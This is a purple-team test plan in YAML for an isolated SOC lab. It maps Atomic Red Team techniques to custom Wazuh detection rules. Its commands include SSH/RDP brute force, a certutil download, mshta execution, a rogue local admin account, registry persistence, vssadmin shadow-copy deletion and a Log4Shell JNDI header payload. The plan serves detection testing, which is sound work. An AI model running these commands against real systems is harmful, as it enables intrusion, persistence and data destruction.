@@ -1,0 +1,313 @@
+# ============================================================
+# Advanced SOC Lab — Atomic Red Team Test Plan
+# ============================================================
+# Defines a curated set of Atomic Red Team (https://github.com/redcanaryco/atomic-red-team)
+# tests mapped directly to the custom Wazuh detection rules in
+# 09_Detection_Rules/local_rules.xml. Use with Invoke-AtomicRedTeam
+# (Windows) or the atomic-operator Python runner (cross-platform).
+#
+# Windows usage (PowerShell, run as Administrator):
+#   Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
+#   Invoke-AtomicTest T1003.001 -TestNumbers 1
+#
+# Cross-platform usage (atomic-operator):
+#   pip install atomic-operator --break-system-packages
+#   atomic-operator run --techniques T1003.001 --test-guids <guid>
+#
+# After each test, verify the corresponding wazuh_rule_id fired:
+#   curl -sk -u admin:pass "https://localhost:9200/wazuh-alerts-*/_search?q=rule.id:<id>&size=1&pretty"
+# ============================================================
+
+metadata:
+  name: "Advanced SOC Lab — Purple Team Validation Suite"
+  description: >
+    Atomic Red Team test sequence used to validate detection coverage
+    for the custom Wazuh ruleset. Run against win10-victim and
+    ubuntu-webserver in the isolated 192.168.56.0/24 lab network only.
+  target_hosts:
+    - win10-victim   # 192.168.56.30
+    - ubuntu-webserver  # 192.168.56.40
+  expected_runtime_minutes: 25
+  cleanup_required: true
+
+tests:
+
+  # ──────────────────────────────────────────────────────
+  # T1110.001 — Brute Force: Password Guessing
+  # ──────────────────────────────────────────────────────
+  - technique_id: T1110.001
+    technique_name: "Brute Force: Password Guessing"
+    atomic_test_name: "Hydra SSH Brute Force Simulation"
+    platform: linux
+    executor: bash
+    target_host: ubuntu-webserver
+    command: |
+      for i in $(seq 1 15); do
+        sshpass -p "wrongpass$i" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
+          testuser@192.168.56.40 "echo test" 2>/dev/null
+      done
+    wazuh_rule_id: "100001"
+    suricata_sid: "9000002"
+    expected_alert_level: 10
+    cleanup_command: "echo 'No cleanup needed — auth attempts only'"
+
+  # ──────────────────────────────────────────────────────
+  # T1110.001 — RDP Brute Force
+  # ──────────────────────────────────────────────────────
+  - technique_id: T1110.001
+    technique_name: "Brute Force: RDP Password Guessing"
+    atomic_test_name: "RDP Brute Force Simulation"
+    platform: windows
+    executor: powershell
+    target_host: kali-attacker   # source of the attack against win10-victim
+    command: |
+      crowbar -b rdp -s 192.168.56.30/32 -u administrator -C /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
+    wazuh_rule_id: "100003"
+    suricata_sid: "9000004"
+    expected_alert_level: 10
+    cleanup_command: "echo 'No cleanup needed'"
+
+  # ──────────────────────────────────────────────────────
+  # T1059.001 — PowerShell Encoded Command Execution
+  # ──────────────────────────────────────────────────────
+  - technique_id: T1059.001
+    technique_name: "Command and Scripting Interpreter: PowerShell"
+    atomic_test_name: "PowerShell Base64 Encoded Command"
+    platform: windows
+    executor: powershell
+    target_host: win10-victim
+    command: |
+      $cmd = 'Write-Host "Atomic Red Team T1059.001 Test"'
+      $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+      $encoded = [Convert]::ToBase64String($bytes)
+      powershell.exe -EncodedCommand $encoded
+    wazuh_rule_id: "100005"
+    suricata_sid: null
+    expected_alert_level: 12
+    cleanup_command: "echo 'No cleanup needed — no persistence created'"
+
+  # ──────────────────────────────────────────────────────
+  # T1105 — Ingress Tool Transfer (Certutil LOLBin)
+  # ──────────────────────────────────────────────────────
+  - technique_id: T1105
+    technique_name: "Ingress Tool Transfer via Certutil"
+    atomic_test_name: "Certutil Download File"
+    platform: windows
+    executor: command_prompt
+    target_host: win10-victim
+    command: |
+      certutil.exe -urlcache -split -f "http://192.168.56.20/test_payload.txt" C:\Windows\Temp\test_payload.txt
+    wazuh_rule_id: "100006"
+    suricata_sid: null
+    expected_alert_level: 13
+    cleanup_command: |
+      Remove-Item -Path "C:\Windows\Temp\test_payload.txt" -Force -ErrorAction SilentlyContinue
+
+  # ──────────────────────────────────────────────────────
+  # T1218.005 — Signed Binary Proxy Execution: Mshta
+  # ──────────────────────────────────────────────────────
+  - technique_id: T1218.005
+    technique_name: "Signed Binary Proxy Execution: Mshta"
+    atomic_test_name: "Mshta Executes JavaScript"
+    platform: windows
+    executor: command_prompt
+    target_host: win10-victim
+    command: |
+      mshta.exe javascript:close(new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo AtomicTest"))
+    wazuh_rule_id: "100007"
+    suricata_sid: null
+    expected_alert_level: 12
+    cleanup_command: "echo 'No cleanup needed'"
+
+  # ──────────────────────────────────────────────────────
+  # T1047 — Windows Management Instrumentation (Lateral Movement)
+  # ──────────────────────────────────────────────────────
+  - technique_id: T1047
+    technique_name: "Windows Management Instrumentation"
+    atomic_test_name: "WMIC Remote Process Creation"
+    platform: windows
+    executor: command_prompt
+    target_host: win10-victim
+    command: |
+      wmic /node:"192.168.56.30" process call create "cmd.exe /c echo AtomicTest_T1047"
+    wazuh_rule_id: "100008"
+    suricata_sid: null
+    expected_alert_level: 12
+    cleanup_command: "echo 'No cleanup needed'"
+
+  # ──────────────────────────────────────────────────────
+  # T1136.001 — Create Local Account
+  # ──────────────────────────────────────────────────────
+  - technique_id: T1136.001
+    technique_name: "Create Account: Local Account"
+    atomic_test_name: "Create a Local User Account"
+    platform: windows
+    executor: powershell
+    target_host: win10-victim
+    command: |
+      net user atomictestuser "AtomicTest123!" /add /y
+    wazuh_rule_id: "100009"
+    suricata_sid: null
+    expected_alert_level: 14
+    cleanup_command: |
+      net user atomictestuser /delete
+
+  # ──────────────────────────────────────────────────────
+  # T1098 — Account Manipulation (Add to Local Admins)
+  # ──────────────────────────────────────────────────────
+  - technique_id: T1098
+    technique_name: "Account Manipulation: Add to Administrators"
+    atomic_test_name: "Add User to Local Administrators Group"
+    platform: windows
+    executor: powershell
+    target_host: win10-victim
+    depends_on: "Create a Local User Account"   # run T1136.001 test first
+    command: |
+      net localgroup administrators atomictestuser /add
+    wazuh_rule_id: "100010"
+    suricata_sid: null
+    expected_alert_level: 14
+    cleanup_command: |
+      net localgroup administrators atomictestuser /delete
+      net user atomictestuser /delete
+
+  # ──────────────────────────────────────────────────────
+  # T1490 — Inhibit System Recovery (Ransomware Pre-Attack)
+  # ──────────────────────────────────────────────────────
+  - technique_id: T1490
+    technique_name: "Inhibit System Recovery"
+    atomic_test_name: "Delete Volume Shadow Copies via VSSAdmin"
+    platform: windows
+    executor: command_prompt
+    target_host: win10-victim
+    warning: >
+      CAUTION: This deletes shadow copies on the target. Only run on
+      disposable lab VMs with a pre-test snapshot taken.
+    command: |
+      vssadmin.exe delete shadows /all /quiet
+    wazuh_rule_id: "100012"
+    suricata_sid: null
+    expected_alert_level: 15
+    cleanup_command: |
+      echo "Restore VM snapshot after this test — shadow copies cannot be un-deleted"
+
+  # ──────────────────────────────────────────────────────
+  # T1003.001 — OS Credential Dumping: LSASS Memory
+  # ──────────────────────────────────────────────────────
+  - technique_id: T1003.001
+    technique_name: "OS Credential Dumping: LSASS Memory"
+    atomic_test_name: "Mimikatz LSASS Access Simulation"
+    platform: windows
+    executor: powershell
+    target_host: win10-victim
+    warning: >
+      Requires the real Mimikatz binary (not included). Alternatively,
+      use Atomic Red Team's safe LSASS-access simulator test which opens
+      a handle to lsass.exe without dumping credentials, sufficient to
+      trigger Sysmon Event ID 10 / Wazuh rule 100013.
+    command: |
+      # Safe simulation: open a process handle to lsass.exe (no actual dump)
+      $proc = Get-Process lsass
+      $handle = [System.Diagnostics.Process]::GetProcessById($proc.Id).Handle
+    wazuh_rule_id: "100013"
+    suricata_sid: null
+    expected_alert_level: 15
+    cleanup_command: "echo 'No cleanup needed — no credentials were actually dumped'"
+
+  # ──────────────────────────────────────────────────────
+  # T1547.001 — Registry Run Keys / Startup Folder
+  # ──────────────────────────────────────────────────────
+  - technique_id: T1547.001
+    technique_name: "Boot or Logon Autostart Execution: Registry Run Keys"
+    atomic_test_name: "Add Persistence via Registry Run Key"
+    platform: windows
+    executor: powershell
+    target_host: win10-victim
+    command: |
+      New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+        -Name "AtomicTestPersistence" -Value "C:\Windows\System32\calc.exe" -PropertyType String -Force
+    wazuh_rule_id: "100015"
+    suricata_sid: null
+    expected_alert_level: 11
+    cleanup_command: |
+      Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+        -Name "AtomicTestPersistence" -ErrorAction SilentlyContinue
+
+  # ──────────────────────────────────────────────────────
+  # T1046 — Network Service Scanning
+  # ──────────────────────────────────────────────────────
+  - technique_id: T1046
+    technique_name: "Network Service Scanning"
+    atomic_test_name: "Nmap SYN Scan Against Lab Subnet"
+    platform: linux
+    executor: bash
+    target_host: kali-attacker
+    command: |
+      nmap -sS -T4 -p 1-1000 192.168.56.0/24
+    wazuh_rule_id: "100014"
+    suricata_sid: "9000001"
+    expected_alert_level: 8
+    cleanup_command: "echo 'No cleanup needed — read-only scan'"
+
+  # ──────────────────────────────────────────────────────
+  # T1190 — Exploit Public-Facing Application (Log4Shell)
+  # ──────────────────────────────────────────────────────
+  - technique_id: T1190
+    technique_name: "Exploit Public-Facing Application"
+    atomic_test_name: "Log4Shell JNDI Payload in HTTP Header"
+    platform: linux
+    executor: bash
+    target_host: kali-attacker
+    warning: >
+      Requires a vulnerable Log4j test instance on ubuntu-webserver
+      (intentionally vulnerable container, not a real production app).
+    command: |
+      curl -s -A '${jndi:ldap://192.168.56.20:1389/a}' http://192.168.56.40/
+    wazuh_rule_id: "100019"
+    suricata_sid: null
+    expected_alert_level: 15
+    cleanup_command: "echo 'No cleanup needed — header-only test'"
+
+  # ──────────────────────────────────────────────────────
+  # T1110 — Honeypot Interaction (Cowrie)
+  # ──────────────────────────────────────────────────────
+  - technique_id: T1110
+    technique_name: "Brute Force against SSH Honeypot"
+    atomic_test_name: "Cowrie Honeypot Login + Command Execution"
+    platform: linux
+    executor: bash
+    target_host: kali-attacker
+    command: |
+      sshpass -p "password" ssh -o StrictHostKeyChecking=no -p 2222 root@192.168.56.10 "whoami; uname -a; exit"
+    wazuh_rule_id: "100017"
+    suricata_sid: null
+    expected_alert_level: 14
+    cleanup_command: "echo 'No cleanup needed — honeypot session only'"
+
+# ══════════════════════════════════════════════════════════
+# Execution order recommendation (least → most destructive)
+# ══════════════════════════════════════════════════════════
+execution_order:
+  - T1046          # Recon first — establishes baseline
+  - T1110.001       # SSH brute force
+  - T1110.001-rdp   # RDP brute force
+  - T1059.001       # PowerShell encoded command
+  - T1105           # Certutil download
+  - T1218.005       # Mshta execution
+  - T1047           # WMIC lateral movement
+  - T1136.001       # Create local account
+  - T1098           # Add to admins (depends on T1136.001)
+  - T1547.001       # Registry persistence
+  - T1190           # Log4Shell
+  - T1110-cowrie    # Honeypot interaction
+  - T1003.001       # Credential access (safe LSASS handle test)
+  - T1490           # Shadow copy deletion — RUN LAST, restore snapshot after
+
+# ══════════════════════════════════════════════════════════
+# Post-run validation
+# ══════════════════════════════════════════════════════════
+validation:
+  method: "Compare wazuh_rule_id hits in Elasticsearch against this file's test list"
+  script: "16_AI_Automation/mitre_heatmap.py --days 1"
+  pass_criteria: ">= 90% of listed wazuh_rule_id values produced at least one matching alert"
+  report_output: "13_SOC_Performance_Metrics/ (feeds into MTTD calculation)"
